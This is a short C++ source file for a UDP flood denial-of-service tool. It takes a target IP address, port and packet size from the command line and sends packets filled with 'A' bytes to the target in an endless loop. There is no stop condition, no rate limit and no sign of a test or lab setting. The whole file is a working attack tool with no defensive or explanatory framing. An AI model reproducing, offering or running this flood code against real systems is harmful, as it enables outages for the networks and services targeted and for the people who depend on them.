#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>

void udpFlood(const char* targetIp, int targetPort, int packetSize) 
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(targetPort);
    inet_pton(AF_INET, targetIp, &targetAddr.sin_addr);

    char* buffer = new char[packetSize];
    memset(buffer, 'A', packetSize);

    while (true) 
    {
        sendto(sock, buffer, packetSize, 0, (struct sockaddr*)&targetAddr, sizeof(targetAddr));
    }

    delete[] buffer;
    close(sock);
}

int main(int argc, char* argv[]) 
{
    if (argc < 4) 
    {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port> <packet_size>" << std::endl;
        return 1;
    }

    const char* targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int packetSize = std::stoi(argv[3]);

    std::thread udpThread(udpFlood, targetIp, targetPort, packetSize);
    udpThread.join();   

    return 0;
}
